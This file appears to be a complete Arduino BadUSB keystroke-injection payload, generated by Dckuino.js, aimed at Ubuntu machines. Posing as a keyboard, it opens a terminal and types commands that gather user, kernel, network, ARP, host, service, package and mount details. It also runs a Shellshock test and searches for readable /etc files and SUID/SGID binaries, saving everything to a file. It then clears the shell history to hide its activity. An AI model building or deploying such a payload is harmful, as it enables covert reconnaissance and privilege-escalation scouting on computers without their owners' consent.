/*
 * Generated with <3 by Dckuino.js, an open source project !
 */

#include "Keyboard.h"

void typeKey(int key)
{
  Keyboard.press(key);
  delay(50);
  Keyboard.release(key);
}

/* Init function */
void setup()
{
  // Begining the Keyboard stream
  Keyboard.begin();

  // Wait 500ms
  delay(500);

  // Info gathering Ubuntu 1.0 Script issues OS info gathering commands in terminal - by Captain_Harlock, Improved by Thecakeisgit ;D
  delay(3000);

  Keyboard.press(KEY_LEFT_CTRL);
  Keyboard.press(KEY_LEFT_ALT);
  Keyboard.press('t');
  Keyboard.releaseAll();

  delay(1500);

  Keyboard.print("clear");

  delay(10);

  typeKey(KEY_RETURN);

  delay(50);

  Keyboard.print("echo \"Logged in user: \" $USER > info_gathering.txt");

  typeKey(KEY_RETURN);

  delay(50);

  Keyboard.print("echo >> info_gathering.txt");

  delay(50);

  typeKey(KEY_RETURN);

  delay(50);

  Keyboard.print("echo -n \"Distribution Kernel Version: \" >> info_gathering.txt");

  delay(50);

  typeKey(KEY_RETURN);

  delay(50);

  Keyboard.print("cat /etc/issue | cut -c1-13 >> info_gathering.txt");

  delay(50);

  typeKey(KEY_RETURN);

  delay(50);

  Keyboard.print("echo -n \"uname results: \" >> info_gathering.txt");

  delay(50);

  typeKey(KEY_RETURN);

  delay(50);

  Keyboard.print("uname -a >> info_gathering.txt");

  delay(50);

  typeKey(KEY_RETURN);

  delay(100);

  Keyboard.print("echo >> info_gathering.txt");

  delay(50);

  typeKey(KEY_RETURN);

  delay(50);

  Keyboard.print("echo \"Shellsock Bug Vulnerability: \" >> info_gathering.txt");

  delay(50);

  typeKey(KEY_RETURN);

  delay(50);

  Keyboard.print("env x='() { :;}; echo vulnerable' bash -c \"echo this is a test\" >> info_gathering.txt");

  delay(50);

  typeKey(KEY_RETURN);

  delay(50);

  Keyboard.print("echo >> info_gathering.txt");

  delay(50);

  typeKey(KEY_RETURN);

  delay(50);

  Keyboard.print("echo >> info_gathering.txt");

  delay(50);

  typeKey(KEY_RETURN);

  delay(50);

  Keyboard.print("echo \"Mounted filesystems: \" >> info_gathering.txt");

  typeKey(KEY_RETURN);

  delay(50);

  Keyboard.print("mount -l >> info_gathering.txt");

  delay(50);

  typeKey(KEY_RETURN);

  delay(100);

  Keyboard.print("echo >> info_gathering.txt");

  typeKey(KEY_RETURN);

  delay(50);

  Keyboard.print("echo \"Network Configuration: \" >> info_gathering.txt");

  delay(50);

  typeKey(KEY_RETURN);

  delay(50);

  Keyboard.print("ifconfig -a | grep 'Link\\|inet' >> info_gathering.txt");

  typeKey(KEY_RETURN);

  delay(50);

  Keyboard.print("echo >> info_gathering.txt");

  typeKey(KEY_RETURN);

  delay(50);

  Keyboard.print("echo \"Print Hosts: \" >> info_gathering.txt");

  typeKey(KEY_RETURN);

  delay(50);

  Keyboard.print("cat /etc/hosts >> info_gathering.txt");

  typeKey(KEY_RETURN);

  delay(50);

  Keyboard.print("echo \"Print ARP: \" >> info_gathering.txt");

  typeKey(KEY_RETURN);

  delay(50);

  Keyboard.print("arp >> info_gathering.txt");

  typeKey(KEY_RETURN);

  delay(50);

  Keyboard.print("echo >> info_gathering.txt");

  typeKey(KEY_RETURN);

  delay(50);

  Keyboard.print("echo \"Development tools availability: \" >> info_gathering.txt");

  typeKey(KEY_RETURN);

  delay(50);

  Keyboard.print("which gcc >> info_gathering.txt");

  typeKey(KEY_RETURN);

  delay(50);

  Keyboard.print("which g++ >> info_gathering.txt");

  typeKey(KEY_RETURN);

  delay(50);

  Keyboard.print("which python >> info_gathering.txt");

  typeKey(KEY_RETURN);

  delay(50);

  Keyboard.print("echo >> info_gathering.txt");

  typeKey(KEY_RETURN);

  delay(50);

  Keyboard.print("echo \"Print TCP/UDP Listening Services: \" >> info_gathering.txt");

  typeKey(KEY_RETURN);

  delay(50);

  Keyboard.print("netstat -tunlpe >> info_gathering.txt");

  typeKey(KEY_RETURN);

  delay(300);

  Keyboard.print("echo >> info_gathering.txt");

  typeKey(KEY_RETURN);

  delay(50);

  Keyboard.print("echo \"Installed Packages: \" >> info_gathering.txt");

  delay(50);

  typeKey(KEY_RETURN);

  delay(200);

  Keyboard.print("dpkg -l >> info_gathering.txt");

  typeKey(KEY_RETURN);

  delay(300);

  Keyboard.print("echo >> info_gathering.txt");

  typeKey(KEY_RETURN);

  delay(50);

  Keyboard.print("echo \"Find Readable Folders in /etc: \" >> info_gathering.txt");

  typeKey(KEY_RETURN);

  delay(50);

  Keyboard.print("find /etc -user $(id -u) -perm -u=r -o -group $(id -g) -perm -g=r -o -perm -o=r -ls 2> /dev/null >> info_gathering.txt");

  typeKey(KEY_RETURN);

  delay(500);

  Keyboard.print("echo >> info_gathering.txt");

  typeKey(KEY_RETURN);

  delay(50);

  Keyboard.print("echo \"Find SUID and GUID files\" >> info_gathering.txt");

  typeKey(KEY_RETURN);

  delay(50);

  Keyboard.print("find / -type f -perm -u=s -o -type f -perm -g=s -ls  2> /dev/null >> info_gathering.txt");

  delay(50);

  typeKey(KEY_RETURN);

  delay(15000);

  Keyboard.print("history -c");

  delay(50);

  typeKey(KEY_RETURN);

  delay(50);

  Keyboard.print("exit");

  delay(50);

  typeKey(KEY_RETURN);

  // Ending stream
  Keyboard.end();
}

/* Unused endless loop */
void loop() {}
